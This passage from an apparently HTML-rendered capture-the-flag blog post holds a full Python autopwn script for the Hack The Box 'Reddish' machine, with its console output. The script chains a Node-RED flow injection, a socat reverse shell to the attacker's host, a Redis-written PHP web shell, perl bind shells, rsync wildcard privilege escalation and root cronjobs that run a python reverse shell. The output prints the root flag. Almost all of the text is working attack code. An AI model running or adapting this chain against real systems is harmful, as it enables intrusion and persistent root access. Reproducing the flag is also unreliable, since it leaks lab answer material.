id&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en&quot;</span>,<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p1.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            uid = json_data = json.loads(response.text)[<span class="string">&quot;id&quot;</span>].strip()</span><br><span class="line">            p1.success(<span class="string">&quot;OK (id = &quot;</span> + uid + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p1.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Load flows</span></span><br><span class="line">    p2 = log.progress(<span class="string">&quot;Loading node-red flows&quot;</span>)</span><br><span class="line">    with open(SOCAT_SRCPATH, <span class="string">&#x27;r&#x27;</span>) as f:</span><br><span class="line">        b64upload = base64.b64encode(f.read())</span><br><span class="line">    rawBody = <span class="string">&quot;&#123;\&quot;flows\&quot;:[&#123;\&quot;id\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;type\&quot;:\&quot;tab\&quot;,\&quot;label\&quot;:\&quot;Flow 1\&quot;&#125;,&#123;\&quot;id\&quot;:\&quot;6c08c84b.d9c578\&quot;,\&quot;type\&quot;:\&quot;inject\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;topic\&quot;:\&quot;\&quot;,\&quot;payload\&quot;:\&quot;node -e &#x27;(function()&#123; var  cp = require(\\\&quot;child_process\\\&quot;), sh = cp.spawn(\\\&quot;/bin/sh\\\&quot;, [\\\&quot;-c\\\&quot;, \\\&quot;cat &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot;.b64 | base64 -d &gt; &quot;</span> +SOCAT_DSTPATH + <span class="string">&quot; &amp;&amp; chmod +x &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; &amp;&amp; &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; exec:/bin/bash,pty,rawer,echo=0,stderr,setsid,sigint tcp:&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> + LPORT1 + <span class="string">&quot;\\\&quot;]); return /a/; &#125;)();&#x27;\&quot;,\&quot;payloadType\&quot;:\&quot;str\&quot;,\&quot;repeat\&quot;:\&quot;\&quot;,\&quot;crontab\&quot;:\&quot;\&quot;,\&quot;once\&quot;:false,\&quot;onceDelay\&quot;:0.1,\&quot;x\&quot;:151,\&quot;y\&quot;:88,\&quot;wires\&quot;:[[\&quot;d27da06a.44a1a\&quot;]]&#125;,&#123;\&quot;id\&quot;:\&quot;d27da06a.44a1a\&quot;,\&quot;type\&quot;:\&quot;exec\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;command\&quot;:\&quot;\&quot;,\&quot;addpay\&quot;:true,\&quot;append\&quot;:\&quot;\&quot;,\&quot;useSpawn\&quot;:\&quot;false\&quot;,\&quot;timer\&quot;:\&quot;\&quot;,\&quot;oldrc\&quot;:false,\&quot;name\&quot;:\&quot;\&quot;,\&quot;x\&quot;:310,\&quot;y\&quot;:80,\&quot;wires\&quot;:[[],[],[]]&#125;,&#123;\&quot;id\&quot;:\&quot;fae51292.d8e68\&quot;,\&quot;type\&quot;:\&quot;inject\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;topic\&quot;:\&quot;\&quot;,\&quot;payload\&quot;:\&quot;&quot;</span> + b64upload +<span class="string">&quot;\&quot;,\&quot;payloadType\&quot;:\&quot;str\&quot;,\&quot;repeat\&quot;:\&quot;\&quot;,\&quot;crontab\&quot;:\&quot;\&quot;,\&quot;once\&quot;:false,\&quot;onceDelay\&quot;:0.1,\&quot;x\&quot;:113,\&quot;y\&quot;:260,\&quot;wires\&quot;:[[\&quot;7e1e7cb5.664234\&quot;]]&#125;,&#123;\&quot;id\&quot;:\&quot;7e1e7cb5.664234\&quot;,\&quot;type\&quot;:\&quot;file\&quot;,\&quot;z\&quot;:\&quot;e97f052f.2f3d48\&quot;,\&quot;name\&quot;:\&quot;\&quot;,\&quot;filename\&quot;:\&quot;&quot;</span> + SOCAT_DSTPATH +<span class="string">&quot;.b64\&quot;,\&quot;appendNewline\&quot;:false,\&quot;createDir\&quot;:false,\&quot;overwriteFile\&quot;:\&quot;true\&quot;,\&quot;x\&quot;:320,\&quot;y\&quot;:260,\&quot;wires\&quot;:[]&#125;]&#125;&quot;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/flows&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json; charset=utf-8&quot;</span>,<span class="string">&quot;Node-RED-Deployment-Type&quot;</span>:<span class="string">&quot;full&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/flows&quot;</span>, data=rawBody, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p2.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p2.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p2.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject base64-encoded socat</span></span><br><span class="line">    p3 = log.progress(<span class="string">&quot;Injecting base64-encoded socat&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/inject/fae51292.d8e68&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span>+uid+<span class="string">&quot;/inject/fae51292.d8e68&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p3.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p3.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p3.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Inject nodejs reverse shell</span></span><br><span class="line">    p4 = log.progress(<span class="string">&quot;Injecting socat reverse shell via nodejs [&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> + str(LPORT1) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">    headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;*/*&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0&quot;</span>,<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span> + uid + <span class="string">&quot;/inject/6c08c84b.d9c578&quot;</span>,<span class="string">&quot;Node-RED-API-Version&quot;</span>:<span class="string">&quot;v2&quot;</span>,<span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span>,<span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;en-US,en;q=0.5&quot;</span>,<span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://10.10.10.94:1880/red/&quot;</span> + uid + <span class="string">&quot;/inject/6c08c84b.d9c578&quot;</span>, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != 200:</span><br><span class="line">            p4.failure(<span class="string">&quot;Status &quot;</span>+str(response.status_code))</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p4.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        p4.failure(str(e))</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;What shell do you want?&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1] root@nodered&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[2] www-data@www&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[3] root@www&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[4] root@backup&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[5] root@reddish&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[6] Exit&quot;</span>)</span><br><span class="line">response = None</span><br><span class="line"><span class="keyword">while</span> response not <span class="keyword">in</span> [<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>]:</span><br><span class="line">    response = raw_input(<span class="string">&quot;Please enter a number 1-6: &quot;</span>).strip()</span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;6&quot;</span>:</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    threading.Thread(target=send_payloads).start()</span><br><span class="line">except Exception as e:</span><br><span class="line">    log.error(str(e))</span><br><span class="line">socat = listen(LPORT1, bindaddr=LHOST, timeout=20).wait_for_connection()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Uploading &quot;</span> + UUIDNAME + <span class="string">&quot;.php on the www container via redis&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;*1\\r\\n<span class="variable">$8</span>\\r\\nFLUSHALL\\r\\n*3\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$1</span>\\r\\n1\\r\\n<span class="variable">$45</span>\\r\\n&lt;?php echo shell_exec(<span class="variable">$_GET</span>[\&quot;e\&quot;].\&quot; 2&gt;&amp;1\&quot;); ?&gt;\\r\\n*4\\r\\n<span class="variable">$6</span>\\r\\nCONFIG\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$10</span>\\r\\ndbfilename\\r\\n<span class="variable">$12</span>\\r\\n&quot;</span> + UUIDNAME +  <span class="string">&quot;.php\\r\\n*4\\r\\n<span class="variable">$6</span>\\r\\nCONFIG\\r\\n<span class="variable">$3</span>\\r\\nSET\\r\\n<span class="variable">$3</span>\\r\\ndir\\r\\n<span class="variable">$46</span>\\r\\n/var/www/html/8924d0549008565c554f8128cd11fda4\\r\\n*1\\r\\n<span class="variable">$4</span>\\r\\nSAVE\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:redis:6379&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;GET /8924d0549008565c554f8128cd11fda4/&quot;</span> + UUIDNAME+ <span class="string">&quot;.php?e=<span class="subst">$(whoami)</span>@<span class="subst">$(hostname)</span>END HTTP/1.1\\r\\nHost: nodered\\r\\nUser-agent: curl\\r\\n\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:www:80&quot;</span>)</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;www-data@www&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;www-data@www&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK (user = www-data@www)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending perl bind shell [www-data@www:&quot;</span> + str(LPORT2) + <span class="string">&quot;] via &quot;</span> + UUIDNAME + <span class="string">&quot;.php &amp; trying to connect&quot;</span>) as p:</span><br><span class="line">    perl_payload = <span class="string">&quot;perl -e &#x27;use Socket;<span class="variable">$p</span>=&quot;</span> + str(LPORT2) +<span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));bind(S,sockaddr_in(<span class="variable">$p</span>, INADDR_ANY));listen(S,SOMAXCONN);for(;<span class="variable">$p</span>=accept(C,S);close C)&#123;open(STDIN,\&quot;&gt;&amp;C\&quot;);open(STDOUT,\&quot;&gt;&amp;C\&quot;);open(STDERR,\&quot;&gt;&amp;C\&quot;);exec(\&quot;/bin/bash -i\&quot;);&#125;;&#x27;&quot;</span></span><br><span class="line">    urled_perl_payload = urllib.quote_plus(perl_payload)</span><br><span class="line">    socat.sendline(<span class="string">&quot;/bin/echo -ne &#x27;GET /8924d0549008565c554f8128cd11fda4/&quot;</span> + UUIDNAME + <span class="string">&quot;.php?e=&quot;</span> + urled_perl_payload + <span class="string">&quot; HTTP/1.1\\r\\nHost: nodered\\r\\nUser-Agent: curl\\r\\n\\r\\n&#x27; | &quot;</span> + SOCAT_DSTPATH + <span class="string">&quot; - TCP:www:80&quot;</span>)</span><br><span class="line">    socat.sendline(SOCAT_DSTPATH + <span class="string">&quot; file:`tty`,echo=0,rawer TCP:www:&quot;</span> + str(LPORT2))</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;shell&quot;</span>, timeout=20)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;shell&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    socat.sendline(<span class="string">&quot;script --return -c &#x27;/bin/bash -i&#x27; /dev/null&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;stty raw -echo&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Exploiting wildcards for privesc. Wait at most 180 secs for rsync backup job to run&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&#x27;echo &quot;/bin/cp /bin/bash &#x27;</span> + SUBASH_PATH + <span class="string">&#x27;;/bin/chmod 4755 &#x27;</span> + SUBASH_PATH + <span class="string">&#x27;&quot; &gt; &quot;/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/&#x27;</span> + UUIDNAME + <span class="string">&#x27;.rdb&quot;&#x27;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&#x27;touch &quot;/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e sh &#x27;</span> + UUIDNAME + <span class="string">&#x27;.rdb&quot;&#x27;</span>)</span><br><span class="line">    count = 0</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        p.status(str(count))</span><br><span class="line">        sleep(1)</span><br><span class="line">        socat.sendline(<span class="string">&quot;[ -f &quot;</span> + SUBASH_PATH + <span class="string">&quot; ] &amp;&amp; echo &#x27;OK&#x27; || echo &#x27;NO&#x27;&quot;</span>)</span><br><span class="line">        socat.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">        output = socat.recv(3).strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;OK&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">            p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        count += 1</span><br><span class="line">        <span class="keyword">if</span> count &gt; 180:</span><br><span class="line">            p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">    socat.sendline(SUBASH_PATH + <span class="string">&#x27; -i -p&#x27;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;cd /root&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending a cronjob for bind shell [root@backup:&quot;</span> +str(LPORT3)+ <span class="string">&quot;]. Please wait&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;use Socket;<span class="variable">$p</span>=&quot;</span> + str(LPORT3) + <span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));bind(S,sockaddr_in(<span class="variable">$p</span>, INADDR_ANY));listen(S,SOMAXCONN);for(;<span class="variable">$p</span>=accept(C,S);close C)&#123;open(STDIN,\&quot;&gt;&amp;C\&quot;);open(STDOUT,\&quot;&gt;&amp;C\&quot;);open(STDERR,\&quot;&gt;&amp;C\&quot;);exec(\&quot;/bin/bash -i\&quot;);&#125;;&#x27; &gt; &quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;* * * * * root /usr/bin/perl &quot;</span> + CRONPL_PATH +  <span class="string">&quot;.pl&#x27; &gt; &quot;</span> + CRONPL_PATH + <span class="string">&quot;cronjob&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;rsync -a &quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl backup::src&quot;</span> + CRONPL_PATH + <span class="string">&quot;.pl&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;rsync -a &quot;</span> + CRONPL_PATH + <span class="string">&quot;cronjob backup::src/etc/cron.d/&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(62):</span><br><span class="line">        p.status(str(61 - i))</span><br><span class="line">        time.sleep(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;perl -MFcntl=F_SETFL,F_GETFL,O_NONBLOCK -MSocket &#x27;-e<span class="variable">$0</span>=perl;socket(<span class="variable">$c</span>,AF_INET,SOCK_STREAM,0)&amp;&amp;connect(<span class="variable">$c</span>,pack_sockaddr_in(&quot;</span>+ str(LPORT3) + <span class="string">&quot;,inet_aton(\&quot;backup\&quot;)))||die$!;fcntl<span class="variable">$_</span>,F_SETFL,O_NONBLOCK|fcntl<span class="variable">$_</span>,F_GETFL,0 for@d=(*STDIN,<span class="variable">$c</span>),@e=(<span class="variable">$c</span>,*STDOUT);L:for(0,1)&#123;sysread(<span class="variable">$d</span>[<span class="variable">$_</span>],<span class="variable">$f</span>,8**5)||exit and<span class="variable">$f</span>[<span class="variable">$_</span>].=<span class="variable">$f</span> if vec<span class="variable">$g</span>,<span class="variable">$_</span>*(<span class="variable">$h</span>=fileno<span class="variable">$c</span>),1;substr<span class="variable">$f</span>[<span class="variable">$_</span>],0,syswrite(<span class="variable">$e</span>[<span class="variable">$_</span>],<span class="variable">$f</span>[<span class="variable">$_</span>],8**5),\&quot;\&quot;;vec(<span class="variable">$g</span>,<span class="variable">$_</span>*<span class="variable">$h</span>,1)=(<span class="variable">$i</span>=length<span class="variable">$f</span>[<span class="variable">$_</span>]&lt;8**5);vec(<span class="variable">$j</span>,<span class="variable">$_</span>||<span class="variable">$h</span>,1)=!!<span class="variable">$i</span>&#125;select<span class="variable">$g</span>,<span class="variable">$j</span>,<span class="variable">$k</span>,5;goto L&#x27;&quot;</span>)</span><br><span class="line">    output = socat.recvuntil(<span class="string">&quot;shell&quot;</span>, timeout=20)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;shell&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    socat.sendline(<span class="string">&quot;script --return -c &#x27;/bin/bash -i&#x27; /dev/null&quot;</span>)</span><br><span class="line">    socat.clean(1)</span><br><span class="line">    socat.sendline(<span class="string">&quot;stty raw -echo&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> response == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">    socat.interactive()</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">with log.progress(<span class="string">&quot;Sending reverse shell cronjob [&quot;</span> + LHOST + <span class="string">&quot;:&quot;</span> +str(LPORT4)+ <span class="string">&quot;] for root@host. Please wait&quot;</span>) as p:</span><br><span class="line">    socat.sendline(<span class="string">&quot;mkdir /mnt/sda1&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;mount /dev/sda1 /mnt/sda1&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;cat /mnt/sda1/root/root.txt&quot;</span>)</span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span> + LHOST + <span class="string">&quot;\&quot;,&quot;</span> + str(LPORT4) + <span class="string">&quot;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\&quot;HISTFILE\&quot;,\&quot;/dev/null\&quot;);pty.spawn([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);s.close();exit();&#x27; &gt; /mnt/sda1/tmp/&quot;</span> + UUIDNAME + <span class="string">&quot;.py&quot;</span>) </span><br><span class="line">    socat.sendline(<span class="string">&quot;echo &#x27;* * * * * root /usr/bin/python /tmp/&quot;</span> + UUIDNAME + <span class="string">&quot;.py&#x27; &gt; /mnt/sda1/etc/cron.d/&quot;</span> + UUIDNAME + <span class="string">&quot;cronjob&quot;</span>)</span><br><span class="line">    host_shell = listen(LPORT4, bindaddr=LHOST, timeout=65).wait_for_connection()</span><br><span class="line">    <span class="keyword">if</span> host_shell.sock is None:</span><br><span class="line">        p.failure(<span class="string">&quot;FAIL&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.success(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">    host_shell.interactive()</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>

<p>effect as below:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python autopwnreddish.py </span></span><br><span class="line">What shell <span class="keyword">do</span> you want?</span><br><span class="line">[1] root@nodered</span><br><span class="line">[2] www-data@www</span><br><span class="line">[3] root@www</span><br><span class="line">[4] root@backup</span><br><span class="line">[5] root@reddish</span><br><span class="line">[6] Exit</span><br><span class="line">Please enter a number 1-6: 1</span><br><span class="line">[+] Getting our id: OK (id = c507228abb96d45d0541fd5eacebd9dd)</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60000: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60000: Got connection from 10.10.10.94 on port 36186</span><br><span class="line">[+] Loading node-red flows: OK</span><br><span class="line">[+] Injecting base64-encoded socat: OK</span><br><span class="line">[+] Injecting socat reverse shell via nodejs [10.10.14.9:60000]: OK</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ whoami</span></span><br><span class="line">root</span><br><span class="line">root@nodered:/node-red<span class="comment"># $ cd ~</span></span><br><span class="line">root@nodered:~<span class="comment"># $ ls</span></span><br><span class="line">root@nodered:~<span class="comment"># $ exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">[*] Closed connection to 10.10.10.94 port 36186</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># python autopwnreddish.py </span></span><br><span class="line">What shell <span class="keyword">do</span> you want?</span><br><span class="line">[1] root@nodered</span><br><span class="line">[2] www-data@www</span><br><span class="line">[3] root@www</span><br><span class="line">[4] root@backup</span><br><span class="line">[5] root@reddish</span><br><span class="line">[6] Exit</span><br><span class="line">Please enter a number 1-6: 5</span><br><span class="line">[+] Getting our id: OK (id = c507228abb96d45d0541fd5eacebd9dd)</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60000: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60000: Got connection from 10.10.10.94 on port 36192</span><br><span class="line">[+] Loading node-red flows: OK</span><br><span class="line">[+] Injecting base64-encoded socat: OK</span><br><span class="line">[+] Injecting socat reverse shell via nodejs [10.10.14.9:60000]: OK</span><br><span class="line">[+] Uploading 83df6e1b.php on the www container via redis: OK (user = www-data@www)</span><br><span class="line">[+] Sending perl <span class="built_in">bind</span> shell [www-data@www:62236] via 83df6e1b.php &amp; trying to connect: OK</span><br><span class="line">[+] Exploiting wildcards <span class="keyword">for</span> privesc. Wait at most 180 secs <span class="keyword">for</span> rsync backup job to run: OK</span><br><span class="line">[+] Sending a cronjob <span class="keyword">for</span> <span class="built_in">bind</span> shell [root@backup:65274]. Please <span class="built_in">wait</span>: OK</span><br><span class="line">[+] Sending reverse shell cronjob [10.10.14.9:60001] <span class="keyword">for</span> root@host. Please <span class="built_in">wait</span>: OK</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to 10.10.14.9 on port 60001: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on 10.10.14.9:60001: Got connection from 10.10.10.94 on port 49704</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">root@reddish:~<span class="comment"># $ id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@reddish:~<span class="comment"># $ whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@reddish:~<span class="comment"># $ hostname</span></span><br><span class="line">hostname</span><br><span class="line">reddish</span><br><span class="line">root@reddish:~<span class="comment"># $ ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@reddish:~<span class="comment"># $ cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">50d0db644c8d5ff5312ef3d17c2ed205</span><br></pre></td></tr></table></figure>

<p>very very powerful scripts!!!</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb59.jpg"></li>
</ul>
